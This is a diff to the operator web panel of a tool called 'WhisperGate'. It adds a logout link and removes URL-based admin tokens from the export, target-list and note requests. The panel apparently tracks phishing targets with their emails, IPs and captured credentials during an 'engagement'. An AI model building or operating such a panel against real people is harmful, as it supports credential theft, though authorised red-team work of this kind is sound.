@@ -108,6 +108,7 @@
     <h1><span>WhisperGate</span> Operator Panel</h1>
     <div class="header-right">
       <span><span class="status-dot"></span><span style="font-size:11px;color:var(--text-dim)">Connected</span></span>
+      <a href="/operator/logout" style="font-size:11px;color:var(--text-dim);text-decoration:none;border:1px solid var(--border);padding:3px 10px;border-radius:3px;">Logout</a>
     </div>
   </div>
 
@@ -153,15 +154,14 @@
 
   <script>
     var socket = io('/operator');
-    var targetData = {};  // sid -> {email, ip, credentials[], status, notes, firstSeen}
+    var targetData = {};
     var engagementStart = null;
     var engTimerInterval = null;
-    var adminToken = new URLSearchParams(window.location.search).get('token') || '';
 
     // ── Export link ─────────────────────────────
     document.getElementById('exportBtn').addEventListener('click', function(e) {
       e.preventDefault();
-      window.location.href = '/operator/export?token=' + encodeURIComponent(adminToken);
+      window.location.href = '/operator/export';
     });
 
     // ── Engagement timer ────────────────────────
@@ -305,7 +305,7 @@
     socket.on('connect', function() {
       addLog('Connected to server');
       // Load existing targets
-      fetch('/operator/targets?token=' + encodeURIComponent(adminToken))
+      fetch('/operator/targets')
         .then(function(r) { return r.json(); })
         .then(function(data) {
           if (data.engagement_start) {
@@ -380,7 +380,7 @@
 
     function saveNote(sid, note) {
       targetData[sid].notes = note;
-      fetch('/operator/note?token=' + encodeURIComponent(adminToken), {
+      fetch('/operator/note', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ sid: sid, note: note })
